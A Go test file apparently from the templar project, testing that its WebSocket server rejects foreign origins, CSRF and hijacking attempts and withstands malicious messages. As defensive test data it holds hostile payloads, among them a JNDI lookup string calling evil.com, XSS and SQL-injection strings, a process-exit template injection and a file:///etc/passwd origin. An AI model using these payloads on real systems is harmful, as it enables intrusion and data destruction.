package server

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/conneroisu/templar/internal/config"
	"github.com/gorilla/websocket"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestWebSocketOriginValidation_Security tests WebSocket origin validation security
func TestWebSocketOriginValidation_Security(t *testing.T) {
	// Create a test server with specific configuration
	cfg := &config.Config{
		Server: config.ServerConfig{
			Host: "localhost",
			Port: 8080,
		},
	}

	server, err := New(cfg)
	require.NoError(t, err)

	// Create test server
	testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		server.handleWebSocket(w, r)
	}))
	defer testServer.Close()

	tests := []struct {
		name           string
		origin         string
		expectUpgrade  bool
		description    string
	}{
		{
			name:           "valid localhost origin",
			origin:         "http://localhost:8080",
			expectUpgrade:  true,
			description:    "Should allow valid localhost origin",
		},
		{
			name:           "valid 127.0.0.1 origin",
			origin:         "http://127.0.0.1:8080", 
			expectUpgrade:  true,
			description:    "Should allow valid 127.0.0.1 origin",
		},
		{
			name:           "malicious external origin",
			origin:         "http://evil.com",
			expectUpgrade:  false,
			description:    "Should reject external malicious origin",
		},
		{
			name:           "subdomain attack attempt",
			origin:         "http://localhost.evil.com",
			expectUpgrade:  false,
			description:    "Should reject subdomain attack",
		},
		{
			name:           "port manipulation attempt",
			origin:         "http://localhost:8080.evil.com",
			expectUpgrade:  false,
			description:    "Should reject port manipulation attack",
		},
		{
			name:           "protocol manipulation",
			origin:         "javascript://localhost:8080",
			expectUpgrade:  false,
			description:    "Should reject non-http/https protocols",
		},
		{
			name:           "null origin attack",
			origin:         "null",
			expectUpgrade:  false,
			description:    "Should reject null origin",
		},
		{
			name:           "empty origin header",
			origin:         "",
			expectUpgrade:  false,
			description:    "Should reject empty origin",
		},
		{
			name:           "data URI attack",
			origin:         "data:text/html,<script>alert('xss')</script>",
			expectUpgrade:  false,
			description:    "Should reject data URI origins",
		},
		{
			name:           "file protocol attack",
			origin:         "file:///etc/passwd",
			expectUpgrade:  false,
			description:    "Should reject file protocol",
		},
		{
			name:           "wrong port number",
			origin:         "http://localhost:9999",
			expectUpgrade:  false,
			description:    "Should reject wrong port numbers",
		},
		{
			name:           "https valid origin",
			origin:         "https://localhost:8080",
			expectUpgrade:  true,
			description:    "Should allow HTTPS origins",
		},
		{
			name:           "case manipulation attack",
			origin:         "HTTP://LOCALHOST:8080",
			expectUpgrade:  false,
			description:    "Should be case sensitive for security",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create WebSocket connection request with specific origin
			dialer := websocket.Dialer{
				HandshakeTimeout: 0, // Use default
			}

			// Create request headers with origin
			headers := http.Header{}
			if tt.origin != "" {
				headers.Set("Origin", tt.origin)
			}

			// Convert http:// test server URL to ws://
			wsURL := "ws" + testServer.URL[4:] + "/ws"

			// Attempt WebSocket connection
			conn, resp, err := dialer.Dial(wsURL, headers)

			if tt.expectUpgrade {
				// Should successfully upgrade to WebSocket
				assert.NoError(t, err, tt.description)
				if conn != nil {
					conn.Close()
				}
				if resp != nil {
					assert.Equal(t, http.StatusSwitchingProtocols, resp.StatusCode, 
						"Should return 101 Switching Protocols")
				}
			} else {
				// Should fail to upgrade (either error or bad status)
				if err == nil && resp != nil {
					assert.NotEqual(t, http.StatusSwitchingProtocols, resp.StatusCode, 
						"Should not return 101 Switching Protocols for: %s", tt.description)
					if conn != nil {
						conn.Close()
					}
				} else {
					// Connection failed as expected
					assert.Error(t, err, tt.description)
				}
			}
		})
	}
}

// TestWebSocketSecurity_CSRF tests CSRF protection in WebSocket connections
func TestWebSocketSecurity_CSRF(t *testing.T) {
	cfg := &config.Config{
		Server: config.ServerConfig{
			Host: "localhost", 
			Port: 8080,
		},
	}

	server, err := New(cfg)
	require.NoError(t, err)

	testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		server.handleWebSocket(w, r)
	}))
	defer testServer.Close()

	// Test common CSRF attack vectors
	csrfAttacks := []struct {
		name        string
		origin      string
		referer     string
		description string
	}{
		{
			name:        "cross-site request forgery",
			origin:      "http://attacker.com",
			referer:     "http://attacker.com/malicious.html",
			description: "Should block CSRF from external sites",
		},
		{
			name:        "subdomain takeover attempt",
			origin:      "http://evil.localhost.com",
			referer:     "http://evil.localhost.com",
			description: "Should block subdomain attacks",
		},
		{
			name:        "homograph attack",
			origin:      "http://1ocalhost:8080", // Using "1" instead of "l"
			referer:     "http://1ocalhost:8080",
			description: "Should block homograph domain attacks",
		},
		{
			name:        "port confusion attack",
			origin:      "http://localhost:8080@evil.com",
			referer:     "http://localhost:8080@evil.com",
			description: "Should block port confusion attacks",
		},
	}

	for _, attack := range csrfAttacks {
		t.Run(attack.name, func(t *testing.T) {
			dialer := websocket.Dialer{}
			headers := http.Header{}
			headers.Set("Origin", attack.origin)
			headers.Set("Referer", attack.referer)

			wsURL := "ws" + testServer.URL[4:] + "/ws"
			conn, resp, err := dialer.Dial(wsURL, headers)

			// Should fail to connect
			if err == nil && resp != nil {
				assert.NotEqual(t, http.StatusSwitchingProtocols, resp.StatusCode, 
					attack.description)
				if conn != nil {
					conn.Close()
				}
			} else {
				// Connection failed as expected
				assert.Error(t, err, attack.description)
			}
		})
	}
}

// TestWebSocketSecurity_MessageValidation tests message content validation
func TestWebSocketSecurity_MessageValidation(t *testing.T) {
	cfg := &config.Config{
		Server: config.ServerConfig{
			Host: "localhost",
			Port: 8080,
		},
	}

	server, err := New(cfg)
	require.NoError(t, err)

	testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		server.handleWebSocket(w, r)
	}))
	defer testServer.Close()

	// Establish valid WebSocket connection
	dialer := websocket.Dialer{}
	headers := http.Header{}
	headers.Set("Origin", "http://localhost:8080")

	wsURL := "ws" + testServer.URL[4:] + "/ws"
	conn, _, err := dialer.Dial(wsURL, headers)
	require.NoError(t, err)
	defer conn.Close()

	// Test malicious message patterns
	maliciousMessages := []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE components; --",
		"${jndi:ldap://evil.com/malicious}",
		"{{constructor.constructor('return process')().exit()}}",
		"<img src=x onerror=alert('xss')>",
		string(make([]byte, 1024*1024*10)), // 10MB message (if size limits exist)
	}

	for _, msg := range maliciousMessages {
		t.Run("malicious_message", func(t *testing.T) {
			// Send malicious message
			err := conn.WriteMessage(websocket.TextMessage, []byte(msg))
			
			// The connection should either:
			// 1. Reject the message (preferred)
			// 2. Sanitize the message before processing
			// 3. Close the connection if message is too dangerous
			
			// For now, we just verify the connection doesn't crash
			// In a real implementation, you'd want proper message validation
			if err != nil {
				t.Logf("Message rejected (good): %v", err)
			} else {
				t.Logf("Message accepted - ensure proper validation exists")
			}
		})
	}
}

// TestSecurityRegression_WebSocketHijacking verifies WebSocket hijacking prevention
func TestSecurityRegression_WebSocketHijacking(t *testing.T) {
	cfg := &config.Config{
		Server: config.ServerConfig{
			Host: "localhost",
			Port: 8080,
		},
	}

	server, err := New(cfg)
	require.NoError(t, err)

	testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		server.handleWebSocket(w, r)
	}))
	defer testServer.Close()

	// Common WebSocket hijacking techniques
	hijackingAttempts := []struct {
		name    string
		headers map[string]string
	}{
		{
			name: "missing origin header",
			headers: map[string]string{
				// No Origin header
			},
		},
		{
			name: "spoofed origin",
			headers: map[string]string{
				"Origin": "http://trusted-site.com",
			},
		},
		{
			name: "malformed origin",
			headers: map[string]string{
				"Origin": "not-a-valid-url",
			},
		},
		{
			name: "double origin headers",
			headers: map[string]string{
				"Origin": "http://localhost:8080, http://evil.com",
			},
		},
		{
			name: "origin with null bytes",
			headers: map[string]string{
				"Origin": "http://localhost:8080\x00.evil.com",
			},
		},
	}

	for _, attempt := range hijackingAttempts {
		t.Run(attempt.name, func(t *testing.T) {
			dialer := websocket.Dialer{}
			headers := http.Header{}
			
			for key, value := range attempt.headers {
				headers.Set(key, value)
			}

			wsURL := "ws" + testServer.URL[4:] + "/ws"
			conn, resp, err := dialer.Dial(wsURL, headers)

			// Should fail to establish connection
			if err == nil && resp != nil {
				assert.NotEqual(t, http.StatusSwitchingProtocols, resp.StatusCode, 
					"WebSocket hijacking should be prevented: %s", attempt.name)
				if conn != nil {
					conn.Close()
				}
			} else {
				// Connection failed as expected
				t.Logf("Connection properly rejected for: %s", attempt.name)
			}
		})
	}
}